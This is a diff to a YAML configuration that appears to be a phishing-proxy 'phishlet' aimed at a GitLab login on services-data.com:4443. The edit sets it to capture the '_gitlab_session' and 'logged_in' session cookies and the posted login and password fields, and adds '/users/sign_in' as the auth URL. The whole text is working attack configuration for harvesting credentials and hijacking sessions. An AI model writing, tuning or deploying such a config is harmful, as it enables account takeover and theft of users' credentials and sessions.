@@ -17,21 +17,23 @@ sub_filters:
 
 auth_tokens:
   - domain: '.services-data.com:4443'
+    keys: ['logged_in', '_gitlab_session']
+  - domain: 'services-data.com:4443'
     keys: ['_gitlab_session']
 
 credentials:
-  authenticity_token:
-    key: 'authenticity_token'
-    search: '(.*)'
-    type: 'post'
   username:
-    key: 'user[login]'
+    key: 'login'
     search: '(.*)'
     type: 'post'
   password:
-    key: 'user[password]'
+    key: 'password'
     search: '(.*)'
     type: 'post'
+
+auth_urls:
+#  - '/'
+  - '/users/sign_in'
 
 login:
   domain: 'services-data.com:4443'
